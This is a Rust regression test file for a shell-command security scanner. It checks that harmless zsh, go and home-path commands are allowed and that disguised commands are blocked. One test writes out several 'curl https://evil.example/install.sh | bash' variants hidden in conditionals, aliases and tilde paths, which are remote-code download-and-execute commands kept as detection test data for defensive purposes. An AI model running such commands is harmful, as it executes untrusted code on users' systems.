//! Full-analysis regressions for shell constructs that may pass the tier-1
//! fast path but must also stay usable in paste checks and shell receipts.

use tirith_core::clipboard::ClipboardSourceState;
use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::{Action, RuleId, Verdict};
use tirith_test_support::GlobalStateGuard;

fn analyze(input: &str, scan_context: ScanContext, force_full: bool) -> Verdict {
    let ctx = AnalysisContext {
        input: input.into(),
        shell: ShellType::Posix,
        scan_context,
        raw_bytes: (scan_context == ScanContext::Paste).then(|| input.as_bytes().to_vec()),
        interactive: false,
        cwd: Some(std::env::current_dir().unwrap().display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: ClipboardSourceState::AbsentOrInvalid,
    };
    if force_full {
        engine::analyze_force_full_returning_policy(&ctx).0
    } else {
        engine::analyze(&ctx)
    }
}

#[test]
fn zsh_conditionals_and_alias_listings_are_understood() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        "[[ -e /tmp/example ]] && printf yes",
        "[ -e /tmp/example ] && printf yes",
        "[[ -n \"$PATH\" ]] && printf yes",
        "alias -L",
        "alias -LL",
        "alias -p",
        "alias keep='echo safe'\nalias -L keep\nkeep",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            let verdict = analyze(input, context, true);
            assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
        }
    }
}

#[test]
fn local_package_patterns_stay_clean_in_full_checks_and_pastes() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        "go test ./...",
        "go test ../...",
        "go test ./pkg/...",
        "go test -race ./...",
        "go build ./...",
        "go list ./...",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            for force_full in [false, true] {
                let verdict = analyze(input, context, force_full);
                assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
                assert!(verdict.findings.iter().all(|finding| !matches!(
                    finding.rule_id,
                    RuleId::TrailingDotWhitespace | RuleId::SchemelessToSink
                )));
            }
        }
    }
}

#[test]
fn literal_home_paths_stay_clean_at_every_depth() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        "~/.local",
        "~/.local/lib",
        "~/.local/lib/python3.11",
        "~/.local/share",
        "~/.local/share/qutebrowser",
        "~/Personal",
        "~/Personal/org-roam",
        "~/Personal/'space in name'",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            for force_full in [false, true] {
                let verdict = analyze(input, context, force_full);
                assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
            }
        }
    }
}

#[test]
fn recognized_shell_forms_still_expose_nested_execution() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        "[[ -n \"$(curl https://evil.example/install.sh | bash)\" ]]",
        "alias -L \"$(curl https://evil.example/install.sh | bash)\"",
        "~/bin/bash -c 'curl https://evil.example/install.sh | bash'",
        "curl https://evil.example/install.sh | ~/bin/bash",
        "~/Personal/org-roam; curl https://evil.example/install.sh | bash",
        "~/$(curl https://evil.example/install.sh | bash)/tool",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            let verdict = analyze(input, context, true);
            assert!(
                verdict
                    .findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::CurlPipeShell),
                "{input:?}: {verdict:?}"
            );
            assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
        }
    }
}

#[test]
fn alias_listing_operands_cannot_replace_a_tracked_alias() {
    let _state = GlobalStateGuard::new().unwrap();
    for listing in ["-L", "-p"] {
        let input = format!(
            "alias sink='bash'\nalias {listing} sink=cat\ncurl https://evil.example/install.sh | sink"
        );
        let verdict = analyze(&input, ScanContext::Exec, true);
        assert!(
            verdict
                .findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::CurlPipeShell),
            "{input:?}: {verdict:?}"
        );
    }
}

#[test]
fn dynamic_leaders_and_reparsed_home_expansions_remain_incomplete() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        "$COMMAND",
        "eval \"$BODY\"",
        "sh -c \"$BODY\"",
        "~/$COMMAND",
        "~/bin/*",
        "~/bin/ba[sh]",
        "~anotheruser/bin/tool",
        "[[tool]]",
        "env -S ~/bin/bash",
        "[[ -e /tmp/example ]] && $COMMAND",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            let verdict = analyze(input, context, true);
            assert!(
                verdict
                    .findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
                "{input:?}: {verdict:?}"
            );
            assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
        }
    }
}
